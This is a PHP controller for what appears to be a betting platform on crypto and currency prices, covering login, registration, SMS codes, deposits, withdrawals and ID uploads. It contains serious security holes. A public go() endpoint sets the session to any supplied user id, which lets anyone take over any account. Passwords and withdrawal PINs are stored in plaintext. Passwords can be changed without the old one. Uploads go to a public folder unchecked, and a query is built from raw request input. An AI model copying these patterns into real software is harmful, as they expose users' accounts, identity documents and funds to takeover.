<?php
namespace app\index\controller;
use think\Controller;
use think\Session;
use think\Db;
use app\common\Model\UserModel;
use app\common\Model\HcyModel;
use app\common\Model\CyModel;
use think\paginator;
use think\Request;

class Index extends Controller
{
     //获取K线图数据
	public function getmark()
	{   
    	$mark = $_POST;
    	if(empty($mark['create_time'])){die;}
	    $create_time = date("Y-m-d H:i:00",$mark['create_time']);
	    $HcyModel = new HcyModel();
	    $array = array();
	    $dbname = array('BTCUSDT','ETHUSDT','DOTUSDT','XRPUSDT','LTCUSDT','XMRUSDT','DASHUSDT','QTUMUSDT','USDGBP','USDEUR','USDCAD','USDAUD');
	    
	    foreach($dbname as $key => $value){
            $data = $HcyModel->field('id,qishu,create_time,currency',true)->where('create_time',$create_time)
                    ->where('currency',"$value")->findOrEmpty()->toArray();
            $array["$value"] = $data;
	    }
		$result['status'] = 1;
    	$result['data'] = $array;
    	$result = json_encode($result);
        return $result;
	}

    public function index2(){
        $sys = DB::table("system_config")->find(1);
        $this->assign('slink',$sys['service_link']);
        return view();
    }

    public function index1(){
        $sys = DB::table("system_config")->find(1);
        $this->assign('slink',$sys['service_link']);
        return view();
    }

    public function test(){

        // $HcyModel = new HcyModel();
        // $hcy = $HcyModel->where('qishu', 10280873)->find();

        // $create_time = date("Y-m-d H:i:00",$mark['create_time']);
	    // $HcyModel = new HcyModel();
	    // $array = array();
	    // $dbname = array('BTCUSDT','ETHUSDT','DOTUSDT','XRPUSDT','LTCUSDT','XMRUSDT','DASHUSDT','QTUMUSDT','USDGBP','USDEUR','USDCAD','USDAUD');
	    
	    // foreach($dbname as $key => $value){
        //     $data = $HcyModel->field('id,qishu,create_time,currency',true)->where('qishu',10280873)
        //             ->where('currency',"$value")->findOrEmpty()->toArray();
        //     $array["$value"] = $data;
	    // }
		// $result['status'] = 1;
    	// $result['data'] = $array;
        // $result = json_encode($result);

        // echo $result;

        return view();
    }

    public function logout(){
        $uid = session('uid');
        session("uid",null);
        session("session",null);
        DB::name("members")->where("id",$uid)->setField("is_login",0);

        $data = array("type"=>1,"data"=>"帳戶已登出");
        return json($data);
    }
    public function register(){
        // $param = request()->param();
        // if(!empty($param["name"])){
        //     $cu = DB::name("members")->where("name",$param["name"])->find();
        //     $cup = DB::name("members")->where("phone",$param["phone"])->find();
        //     $sms = DB::table("sms")->where("dstaddr",$param["phone"])->order("id desc")->find();
        //     if(!empty($cu["name"])){
        //         $data = array("type"=>2,"data"=>"帳號已存在 註冊失敗");
        //     }elseif($sms["code"] != $param["phone_code"]){
        //         $data = array("type"=>2,"data"=>"手機驗證碼錯誤");
        //     }elseif(!empty($cup["phone"])){
        //         $data = array("type"=>2,"data"=>"手機已存在 註冊失敗");
        //     }else{
                // $agurl = str_replace('http://','',request()->domain());
        //         $ag = DB::name("members")->where("agent_uri",$agurl)->where("is_daili",1)->find();
        //         if(!empty($ag)){
        //             $top_id = $ag["id"];
        //             $top_zd = $ag["top_zd"];
        //             $url = $agurl;
        //         }else{
        //             $top_id = "0";
        //             $top_zd = "777777@gmail.com";
        //             $url = $agurl;
        //         }
        //         //判斷註冊來路 $in["top_id"] = $top_id;  $in["top_zd"] = $top_zd; $in["agent_uri_pre"] = $url;
        //         $in["top_id"] = $top_id;
        //         $in["top_zd"] = $top_zd;
        //         $in["agent_uri_pre"] = $url;
        //         $in["is_daili"] = 0;
        //         $in["name"] = $param["name"];
        //         $in["money"] = 0;
        //         $in["real_name"] = $param["real_name"];
        //         $in["phone"] = $param["phone"];
        //         $in["password"] = $param["pwd"];
        //         $in["o_password"] = $param["pwd"];
        //         $in["original_password"] = $param["pwd"];
        //         $in["qk_pwd"] = $param["qk_pwd"];
        //         $in["register_ip"] = request()->ip();
        //         $in["created_at"] = date("Y-m-d H:i:s",time());
        //         $in["updated_at"] = date("Y-m-d H:i:s",time());
        //         DB::name("members")->insert($in);
        //         $gid = Db::name('members')->getLastInsID();
        //         session("uid",$gid);
        //         $data = array("type"=>1,"data"=>"註冊成功");
        //     }
        //     return json($data);
        // }else{
        //     return view();
        // }

        return view();
    }

    public function post_register(){
        
            $cu = DB::name("members")->where("name",$_POST['name'])->find();
            $cup = DB::name("members")->where("phone",$_POST['phone'])->find();
            $sms = DB::table("sms")->where("dstaddr",$_POST['phone'])->order("id desc")->find();
            if(!empty($cu["name"])){
                $data = array("type"=>2,"data"=>"帳號已存在 註冊失敗");
            }elseif($sms["code"] != $_POST['phone_code']){
                $data = array("type"=>2,"data"=>"手機驗證碼錯誤");
            }elseif(!empty($cup["phone"])){
                $data = array("type"=>2,"data"=>"手機已存在 註冊失敗");
            }else{
                $agurl = str_replace('http://','',request()->domain());
                $ag = DB::name("members")->where("agent_uri",$agurl)->where("is_daili",1)->find();
                if(!empty($ag)){
                    $top_id = $ag["id"];
                    $top_zd = $ag["top_zd"];
                    $url = $agurl;
                }else{
                    $top_id = "0";
                    $top_zd = "777777@gmail.com";
                    $url = $agurl;
                }
                //判斷註冊來路 $in["top_id"] = $top_id;  $in["top_zd"] = $top_zd; $in["agent_uri_pre"] = $url;
                $in["top_id"] = $top_id;
                $in["top_zd"] = $top_zd;
                $in["agent_uri_pre"] = $url;
                $in["is_daili"] = 0;
                $in["name"] = $_POST['name'];
                $in["money"] = 0;
                $in["real_name"] = $_POST['real_name'];
                $in["phone"] = $_POST['phone'];
                $in["password"] = $_POST['pwd'];
                $in["o_password"] = $_POST['pwd'];
                $in["original_password"] = $_POST['pwd'];
                $in["qk_pwd"] = $_POST['qk_pwd'];
                $in["register_ip"] = request()->ip();
                $in["created_at"] = date("Y-m-d H:i:s",time());
                $in["updated_at"] = date("Y-m-d H:i:s",time());
                DB::name("members")->insert($in);
                $gid = Db::name('members')->getLastInsID();
                session("uid",$gid);
                $data = array("type"=>1,"data"=>"註冊成功");
            }
            return json($data);
        
    }
    public function sendsms(){
        $sys = DB::table("system_config")->find(1);
        $data = input('post.');//获取值
        $phone = $data['phone'];
        
        $members_phone = DB::table('members')
            ->where('phone',$phone)
            ->find();
        if(empty($members_phone)){
            $username = $sys['sms_id'];
            $password = $sys['sms_key'];
            $web = "money5168.net";
            $code = rand(100000, 999999);
            $codes = "Your verification code is:( " . $code . ") ";
            $url = "https://api.kotsms.com.tw/kotsmsapi-1.php";
            $response = "http://" . $web . "/response";
            $post_data = array(
                "username" => $username,
                "password" => $password,
                "dstaddr" => $phone,
                "smbody" => $codes,
                "response" => $response
            );
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            $output = curl_exec($ch);
            curl_close($ch);
            
            //发送成功写入资料库记录      
            DB::table('sms')->insert(['dstaddr'=>$phone,'code'=>$code,'subtime'=>date('Y-m-d H:i:s',time())]);
            $data=array('status'=>1,'msg'=>'驗證碼獲取成功');
        }else{
            $data=array('status'=>2,'msg'=>'行動電話已被綁定，請重新輸入');
        }
        return json($data);
    }
    public function login(){
        $sys = DB::table("system_config")->find(1);
        $param = request()->param();

        if(!empty($param["name"])){
            $user = DB::name("members")->where('name',$param["name"])->find();
            if(empty($user)){
                $data = array("type"=>2,"data"=>"帳戶不存在");
            }elseif($param["pwd"]!=$user["o_password"]){
                $data = array("type"=>2,"data"=>"密碼錯誤");
            }else{
                if($user["status"]==1){
                    $data = array("type"=>2,"data"=>"帳戶已被禁用");
                }else{
                    $now = date("Y-m-d H:i:s",time());
                    session('uid', $user["id"]);
                    $lastses = $user["id"].strtotime($now).rand(0,999999);
                    session('session', $lastses);
                    DB::name("members")->where("id",$user["id"])->setField("last_session2","2");
                    DB::name("members")->where("id",$user["id"])->setField("is_login",1);
                    DB::name("members")->where("id",$user["id"])->setField("last_session",$lastses);
                    DB::name("members")->where("id",$user["id"])->setField("last_login_at",$now);
                    //写入IP
                    $in["member_id"] = $user["id"];
                    $in["ip"] = request()->ip();
                    DB::name("members")->where("id",$user["id"])->setField("last_login_ip",$in["ip"]);
                    $in["created_at"] = $in["updated_at"] = date("Y-m-d H:i:s",time());
                    DB::name("member_login_log")->insert($in);
                    $data = array("type"=>1,"data"=>"登入成功");
                }
            }
            return json($data);
        }else{
            
            $this->assign('slink',$sys['service_link']);
            return view();
        }
    }
    public function notice(){
        $notice = DB::table("system_notice")->where('on_line',1)->order('updated_at desc')->select();
        $this->assign('notice',$notice);
        return view();
    }

    public function explain(){
        return view();
    }

    //提款
    public function drawing(){
        $uid = session('uid');
        $sys = DB::table("system_config")->find(1);
        if(!empty($uid)){
            $this->assign('slink',$sys['service_link']);
            return view();
        }else{
            $this->assign('slink',$sys['service_link']);
            return view('login');            
        }
    }
    
    //提款
    public function post_draw(){
        $now = date("Y-m-d H:i:s",time());
        $uid = session('uid');
        $rdata = $_POST;

        $money = $rdata['amount'];
        $qk_pwd = $rdata['qk_pwd'];

        $member = Db::table('members')->where('id', $uid)->find();
        $bill_no = date("YmdHis").rand(00000,99999);
        $cqkpwd = $member['cqkpwd'];

        if($cqkpwd >= 5){

            $data = array("type"=>3,"data"=>"安全鎖錯誤高過5次，帳號已停權，請聯繫客服");
            session("uid",null);
            session("session",null);

            Db::table('members')->where('id', $uid)->update(['cqkpwd'=>0,'status'=>1]);
            DB::name("members")->where("id",$uid)->setField("is_login",0);

        }elseif($qk_pwd != $member['qk_pwd']){

            $cqkpwd = $cqkpwd + 1;
            $data = array("type"=>2,"data"=>"原安全鎖錯誤，次數超過5次將會停權，您已錯誤 $cqkpwd 次");
            Db::table('members')->where('id', $uid)->update(['cqkpwd'=>$cqkpwd]);

        }elseif($member['money'] < $money || $member['money'] == 0){

            $data = array("type"=>2,"data"=>"用戶餘額不足");

        }elseif($member['bank_card'] && $member['bank_name']){

            $nmoney = $member['money'] - $money;
            $newdata = [
                'bill_no'       => $bill_no,
                'member_id'     => $uid,
                'name'          => $member['name'],
                'money'         => $money,
                'account'       => $member['bank_card'],
                'status'        => 1,
                'before_money'  => $member['money'],
                'after_money'   => $nmoney,
                'score'         => 0,
                'counter_fee'   => 0,
                'remark'        => 'VIP',
                'bank_name'     => $member['bank_name'],
                'bank_card'     => $member['bank_card'],
                'bank_address'  => $member['bank_address'],
                'user_id'       => 0,
                'created_at'    => $now,
                'updated_at'    => $now,
            ];
    
            Db::name('drawing')->insert($newdata);
            Db::table('members')->where('id', $uid)->update(['money'=>$nmoney,'cqkpwd'=>0]);
            $data = array("type"=>1,"data"=>"送出提款申請成功");
        }else{
            $data = array("type"=>2,"data"=>"請先填寫會員資料完整");
        }

        return json($data);
    }

    //存款
    public function recharge(){
        $uid = session('uid');
        if(!empty($uid)){
            $sys = DB::table("system_config")->find(1);
            $this->assign('min',$sys['ck_min']);
            $this->assign('slink',$sys['service_link']);
            return view();
        }else{
            $sys = DB::table("system_config")->find(1);
            $this->assign('slink',$sys['service_link']);
            return view('login');            
        }
    }

    //存款
    public function post_recharge(){
        $now = date("Y-m-d H:i:s",time());
        $uid = session('uid');
        $rdata = $_POST;

        $money = $rdata['amount'];
        $member = Db::table('members')->where('id', $uid)->find();

        $sys = DB::table("system_config")->find(1);
        if($money < $sys['ck_min']){
            $data = array("type"=>3,"bill_no"=>"","time"=>"","money"=>"");
        }elseif($member['bank_card']){
            $bill_no = date("YmdHis").rand(00000,99999);
            $newdata = [
                'bill_no'       => $bill_no,
                'member_id'     => $uid,
                'name'          => $member['name'],
                'money'         => $money,
                'account'       => $member['bank_card'],
                'status'        => 1,
                'remark'        => 'VIP',
                'before_money'  => $member['money'],
                'after_money'   => $member['money'] - $money,
                'score'         => 0,
                'user_id'       => 0,
                'created_at'    => $now,
                'updated_at'    => $now,
            ];

            Db::name('recharge')->insert($newdata);

            $data = array("type"=>1,"bill_no"=>$bill_no,"time"=>$now,"money"=>$money);
        }else{
            $data = array("type"=>2,"bill_no"=>"","time"=>"","money"=>"");
        }

        return json($data);
    }

    //存提款報表
    public function rd_record(){
        $uid = session('uid');
        if(!empty($uid)){
            $param = request()->param();
            $uid = session('uid');
            if($param['s'] == 'd'){
                //提款報表
                $list = Db::name('drawing')->where('member_id',$uid)->order('id desc')->paginate(20);
            }elseif($param['s'] == 'r'){
                //存款報表
                $list = Db::name('recharge')->where('member_id',$uid)->order('id desc')->paginate(20);
            };

            $page = $list->render();
            $data = $list->all();

            $this->assign('type',$param['s']);
            $this->assign('data',$data);
            $this->assign('page',$page);
            return view();
        }else{
            $sys = DB::table("system_config")->find(1);
            $this->assign('slink',$sys['service_link']);
            return view('login');            
        }
        
    }

    public function userinfo(){
        $uid = session('uid');
        if(!empty($uid)){
            $UserModel = new UserModel();
            $myself = $UserModel->where(['id'=>$uid])->find();
            
            
            $this->assign('name',$myself['name']);
            $this->assign('realname',$myself['real_name']);
            $this->assign('phone',$myself['phone']);
            $this->assign('bank_name',$myself['bank_name']);
            $this->assign('bank_branch_name',$myself['bank_branch_name']);
            $this->assign('bank_card',$myself['bank_card']);
            $this->assign('id_card',$myself['id_card']);
            $this->assign('post_card',$myself['post_card']);
            $this->assign('is_check',$myself['is_check']);
            return view();
        }else{
            $sys = DB::table("system_config")->find(1);
            $this->assign('slink',$sys['service_link']);
            return view('login');            
        }
    }

    public function coinnum(){
        $uid = session('uid');
        if(!empty($uid)){
            $UserModel = new UserModel();
            $myself = $UserModel->where(['id'=>$uid])->find();
            $this->assign('data',$myself);
            return view();
        }else{
            $sys = DB::table("system_config")->find(1);
            $this->assign('slink',$sys['service_link']);
            return view('login');            
        }
    }

    public function update_userinfo(){
        $uid = session('uid');
        $bank = array('004台灣銀行','005土地銀行','006合作金庫','007第一銀行','008華南銀行','009彰化銀行','011上海商銀','012富邦銀行','013國泰世華銀行','016高雄銀行','017兆豐銀行','021花旗商業銀行','039澳盛銀行','048王道銀行','050台企銀行','052渣打銀行','053台中商銀','054京城銀行','081匯豐銀行','101瑞興銀行','102華泰銀行','103新光銀行','108陽信銀行','118板信商銀','147三信銀行','700中華郵政','803聯邦銀行','805遠東銀行','806元大銀行','807永豐銀行','808玉山銀行','809凱基銀行','810星展銀行','812台新銀行','814大眾銀行','815日盛銀行','816安泰銀行','822中國信託');

        if(!empty($uid)){
            $UserModel = new UserModel();
            $myself = $UserModel->where(['id'=>$uid])->find();
            $this->assign('qk_pwd',$myself['qk_pwd']);
            $this->assign('password',$myself['password']);
            $this->assign('name',$myself['name']);
            $this->assign('realname',$myself['real_name']);
            $this->assign('phone',$myself['phone']);
            $this->assign('bank_name',$myself['bank_name']);
            $this->assign('bank_branch_name',$myself['bank_branch_name']);
            $this->assign('bank_card',$myself['bank_card']);
            $this->assign('id_card',$myself['id_card']);
            $this->assign('post_card',$myself['post_card']);
            $this->assign('bank',$bank);
            return view();
        }else{
            $sys = DB::table("system_config")->find(1);
            $this->assign('slink',$sys['service_link']);
            return view('login');            
        }
    }

    public function update_psw(){
        $uid = session('uid');

        if(!empty($uid)){
            return view();
        }else{
            $sys = DB::table("system_config")->find(1);
            $this->assign('slink',$sys['service_link']);
            return view('login');            
        }
    }

    public function post_psw(){
        $uid = session('uid');
        $rdata = $_POST;

        if($rdata['type'] == 1){
            $user = DB::name("members")->where("id",$uid)->find();
            if($rdata['o_password'] != $user['password']){
                $data = array("type"=>2,"data"=>"舊的登入密碼輸入錯誤");
            }else{
                DB::name("members")->where("id",$uid)->update([
                    'password'=>$rdata['password'],
                    'o_password'=>$rdata['password'],
                    'original_password'=>$rdata['password'],
                ]);
                $data = array("type"=>1,"data"=>"登入密碼修改成功");
            }

        }elseif($rdata['type'] == 2){
            $user = DB::name("members")->where("id",$uid)->find();
            $cqkpwd = $user['cqkpwd'];
            if($cqkpwd >= 5){

                $data = array("type"=>2,"data"=>"安全鎖錯誤高過5次，帳號已停權，請聯繫客服");
                session("uid",null);
                session("session",null);
    
                Db::table('members')->where('id', $uid)->update(['cqkpwd'=>0,'status'=>1]);
                DB::name("members")->where("id",$uid)->setField("is_login",0);
    
            }elseif($rdata['o_qk_pwd'] != $user['qk_pwd']){
                $data = 3;
                $cqkpwd = $cqkpwd + 1;
                $data = array("type"=>2,"data"=>"原安全鎖錯誤，次數超過5次將會停權，您已錯誤 $cqkpwd 次");
                Db::table('members')->where('id', $uid)->update(['cqkpwd'=>$cqkpwd]);
            }else{
                DB::name("members")->where("id",$uid)->update([
                    'qk_pwd'=>$rdata['qk_pwd']
                    ,'cqkpwd'=>0
                ]);
                $data = array("type"=>1,"data"=>"安全鎖修改成功");
            }
        }else{
            $data = array("type"=>2,"data"=>"修改失敗，請聯繫客服");
        }

        return json($data);
    }


    public function post_info(){
        $uid = session('uid');
        $rdata = $_POST;

        DB::name("members")->where("id",$uid)
        ->update([
            'bank_name'=>$rdata['bank_name'],
            'bank_branch_name'=>$rdata['bank_branch_name'],
            'bank_card'=>$rdata['bank_card'],
            'password'=>$rdata['password'],
            'o_password'=>$rdata['password'],
            'original_password'=>$rdata['password'],
        ]);
        $data = 1;
        return $data;
    }

    public function uploadimgid()
    {
        $id_file = request()->file('id_pic');
        $uid = session('uid');

        if($id_file){
            $id_info = $id_file->move( '../public/files/upload_id_card');
            $id_imgname = $id_info->getSaveName();
            Db::table('members')->where('id', $uid)
            ->update([
                'id_card'  => "./files/upload_id_card/"."$id_imgname"
            ]);
            $data = 1;
        }else{
            $data = 2;
        }
        return $data;
    }

    public function uploadimgpost(){
        $post_file = request()->file('post_pic');
        $uid = session('uid');
        if($post_file){
            $post_info = $post_file->move( '../public/files/upload_post_card');
            $post_imgname = $post_info->getSaveName();
            Db::table('members')->where('id', $uid)
            ->update([
                'post_card' => "./files/upload_post_card/"."$post_imgname"
            ]);
            $data = 1;
        }else{
            $data = 2;
        }
        return $data;
    }

    public function hiscy(){

        $uid = session('uid');
        if(!empty($uid)){
            $param = request()->param();
            $start = $end  = "";
            $this->assign("start",$start);
            $this->assign("end",$end);
            if(!empty($param["start"]) && !empty($param["end"])){
                $start = $param["start"];
                $end = $param["end"];
                $w[] = array('datetime','between',"'".$start."','".$end."'");
                $this->assign('start',$param["start"]);
                $this->assign('end',$param["end"]);
            }
            $nt = date("Y-m-d H:i:",time())."00";
            $w[] = array('datetime',"<",$nt);
            $res = DB::name("lottery_result_admin_cy")
                    ->where($w)->order('id desc')
                    ->paginate(20);
            $page = $res->render();
            $list = $res->all();
            $c = count($list);
            for($i=0;$i<$c;$i++){
                if($i<$c-1){
                    $list[$i]["BTCUSDT"] = $this->ud($list[$i]["BTCUSDT"],$list[$i+1]["BTCUSDT"],1);
                    $list[$i]["ETHUSDT"] = $this->ud($list[$i]["ETHUSDT"],$list[$i+1]["ETHUSDT"],1);
                    $list[$i]["DOTUSDT"] = $this->ud($list[$i]["DOTUSDT"],$list[$i+1]["DOTUSDT"],1);
                    $list[$i]["XRPUSDT"] = $this->ud($list[$i]["XRPUSDT"],$list[$i+1]["XRPUSDT"],1);
                    $list[$i]["LTCUSDT"] = $this->ud($list[$i]["LTCUSDT"],$list[$i+1]["LTCUSDT"],1);
                    $list[$i]["XMRUSDT"] = $this->ud($list[$i]["XMRUSDT"],$list[$i+1]["XMRUSDT"],1);
                    $list[$i]["DASHUSDT"] = $this->ud($list[$i]["DASHUSDT"],$list[$i+1]["DASHUSDT"],1);
                    $list[$i]["QTUMUSDT"] = $this->ud($list[$i]["QTUMUSDT"],$list[$i+1]["QTUMUSDT"],1);
                    $list[$i]["USDGBP"] = $this->ud($list[$i]["USDGBP"],$list[$i+1]["USDGBP"],1);
                    $list[$i]["USDEUR"] = $this->ud($list[$i]["USDEUR"],$list[$i+1]["USDEUR"],1);
                    $list[$i]["USDCAD"] = $this->ud($list[$i]["USDCAD"],$list[$i+1]["USDCAD"],1);
                    $list[$i]["USDAUD"] = $this->ud($list[$i]["USDAUD"],$list[$i+1]["USDAUD"],1);
                }elseif($i=$c-1){
                    $list[$i]["BTCUSDT"] = $this->ud($list[$i]["BTCUSDT"],$list[$i-1]["BTCUSDT"],2);
                    $list[$i]["ETHUSDT"] = $this->ud($list[$i]["ETHUSDT"],$list[$i-1]["ETHUSDT"],2);
                    $list[$i]["DOTUSDT"] = $this->ud($list[$i]["DOTUSDT"],$list[$i-1]["DOTUSDT"],2);
                    $list[$i]["XRPUSDT"] = $this->ud($list[$i]["XRPUSDT"],$list[$i-1]["XRPUSDT"],2);
                    $list[$i]["LTCUSDT"] = $this->ud($list[$i]["LTCUSDT"],$list[$i-1]["LTCUSDT"],2);
                    $list[$i]["XMRUSDT"] = $this->ud($list[$i]["XMRUSDT"],$list[$i-1]["XMRUSDT"],2);
                    $list[$i]["DASHUSDT"] = $this->ud($list[$i]["DASHUSDT"],$list[$i-1]["DASHUSDT"],2);
                    $list[$i]["QTUMUSDT"] = $this->ud($list[$i]["QTUMUSDT"],$list[$i-1]["QTUMUSDT"],2);
                    $list[$i]["USDGBP"] = $this->ud($list[$i]["USDGBP"],$list[$i-1]["USDGBP"],2);
                    $list[$i]["USDEUR"] = $this->ud($list[$i]["USDEUR"],$list[$i-1]["USDEUR"],2);
                    $list[$i]["USDCAD"] = $this->ud($list[$i]["USDCAD"],$list[$i-1]["USDCAD"],2);
                    $list[$i]["USDAUD"] = $this->ud($list[$i]["USDAUD"],$list[$i-1]["USDAUD"],2);
                }
            }
            $this->assign("list", $list);
            $this->assign("page",$page);
            return view();
        }else{
            $sys = DB::table("system_config")->find(1);
            $this->assign('slink',$sys['service_link']);
            return view('login');            
        }
    }
    private function ud($be,$af,$t){
        if($t==1){
            if($be>=$af){
                $v = "<b style='color:red';>".$be." ⇧</b>";
            }else{
                $v = "<b style='color:green';>".$be." ⇩</b>";
            }    
        }else{
            $v = "<b style='color:blue';>".$be." ⇨</b>";
        }
        return $v;
    }
    public function orderlist(){

        $uid = session('uid');
        if(!empty($uid)){
            $param = request()->param();
            $start = $end = $gametype = "";
            $this->assign("start",$start);
            $this->assign("end",$end);
            $this->assign("gametype",$gametype);

            $w["l.user_id"] = $uid;
            if(!empty($param["gametype"])){
                $w["l.Gtype"] = $param["gametype"];
                $this->assign('gametype',$param["gametype"]);
            }

            if(!empty($param["start"]) && !empty($param["end"])){
                $start = $param["start"];
                $end = $param["end"];

                $list = DB::name("order_lottery_sub")
                ->field("l.win,m.name,sub.id,order_sub_num,quick_type,number,sub.bet_money,sub.status,sub.is_win,l.user_id,l.lottery_number,l.rtype_str,l.bet_time,l.Gtype")
                ->alias('sub')
                ->join("order_lottery l","l.order_num=sub.order_num")
                ->join("members m","m.id=l.user_id")
                ->where($w)->where("l.bet_time",'between',[$start,$end])->order('l.id', "desc")
                ->paginate(20,false,['query'=>request()->param()])->each(function($item,$key){
                    $cqs = DB::name("lottery_result_admin_cy")->where("qishu",$item["lottery_number"])->find();
                    if($item["status"]==1){
                        $item["result"] = $cqs[$item["Gtype"]];
                    }else{
                        $item["result"] = "";
                    }
                    return $item;
                });
                $this->assign('start',$param["start"]);
                $this->assign('end',$param["end"]);
            }else{
                $list = DB::name("order_lottery_sub")
                ->field("l.win,m.name,sub.id,order_sub_num,quick_type,number,sub.bet_money,sub.status,sub.is_win,l.user_id,l.lottery_number,l.rtype_str,l.bet_time,l.Gtype")
                ->alias('sub')
                ->join("order_lottery l","l.order_num=sub.order_num")
                ->join("members m","m.id=l.user_id")
                ->where($w)->order('l.id', "desc")
                ->paginate(20,false,['query'=>request()->param()])->each(function($item,$key){
                    $cqs = DB::name("lottery_result_admin_cy")->where("qishu",$item["lottery_number"])->find();
                    if($item["status"]==1){
                        $item["result"] = $cqs[$item["Gtype"]];
                    }else{
                        $item["result"] = "";
                    }
                    return $item;
                });
            };

            
            $list->toArray();
            $c_bet_money=0;
            $c_is_win=0;
            
            foreach($list as $k=>$v){
                $data = $v;
                $c_bet_money+=$data["bet_money"];
                if($data["status"]==1){
                    $c_is_win +=$data["win"];
                };
            };
            $this->assign("c_bet_money",$c_bet_money);
            $this->assign("c_is_win",$c_is_win);
            $page = $list->render();
            $this->assign("list", $list);
            $this->assign("page",$page);
            return view();
        }else{
            $sys = DB::table("system_config")->find(1);
            $this->assign('slink',$sys['service_link']);
            return view('login');            
        }

    }
	public $type=array(
	
	);
	
    public function index0($id="a")
    { 
        $uid = session('uid');
        if(!empty($uid)){
            $type['101']['title']="比特幣/美金";
        	$type['101']['id']="BTCUSDT";
        	$type['101']['typeid']="a";
        	
        	$type['102']['title']="以太幣/美金";
        	$type['102']['id']="ETHUSDT";
        	$type['102']['typeid']="b";
        	
        	$type['103']['title']="波卡幣/美金";
        	$type['103']['id']="DOTUSDT";
        	$type['103']['typeid']="c";
        	
        	$type['104']['title']="瑞波幣/美金";
        	$type['104']['id']="XRPUSDT";
        	$type['104']['typeid']="d";
        	
        	$type['105']['title']="萊特幣/美金";
        	$type['105']['id']="LTCUSDT";
        	$type['105']['typeid']="e";
        	
        	$type['106']['title']="門羅幣/美金";
        	$type['106']['id']="XMRUSDT";
        	$type['106']['typeid']="f";
        	
        	$type['107']['title']="達世幣/美金";
        	$type['107']['id']="DASHUSDT";
    	    $type['107']['typeid']="g";
    	    
    	    $type['108']['title']="量子鏈幣/美金";
        	$type['108']['id']="QTUMUSDT";
    	    $type['108']['typeid']="h";
    	    
    	    $type['109']['title']="美金/英鎊";
        	$type['109']['id']="USDGBP";
    	    $type['109']['typeid']="i";
    	    
    	    $type['110']['title']="美金/歐元";
        	$type['110']['id']="USDEUR";
    	    $type['110']['typeid']="j";
    	    
    	    $type['111']['title']="美金/加元";
        	$type['111']['id']="USDCAD";
    	    $type['111']['typeid']="k";
    	    
    	    $type['112']['title']="美金/澳元";
        	$type['112']['id']="USDAUD";
    	    $type['112']['typeid']="l";
    	
    		foreach($type as $k=>$v) {
    				if($id==$type[$k]['typeid']){
    				    $game=$type[$k];
    				}
    			}
            $UserModel = new UserModel();
    		$myself = $UserModel->where(['id'=>$uid])->find();
            $sys = DB::table("system_config")->find(1);
            $this->assign('slink',$sys['service_link']);
            $this->assign('uid',$uid);
            $this->assign('gameid',$id);
            $this->assign('game',$game);
            $this->assign('type',$type);
            $this->assign('username',$myself['name']);
            return view();
        }else{
            $sys = DB::table("system_config")->find(1);
            $this->assign('slink',$sys['service_link']);
            return view('index1');
        }
    }
	
	public function go($id){
		session('uid',$id);
	//	print_r(url("bopf"));
		//header('HTTP/1.1 301 Moved Permanently');
		header('Location: http://uu.win7777.net/bopta');
	}
}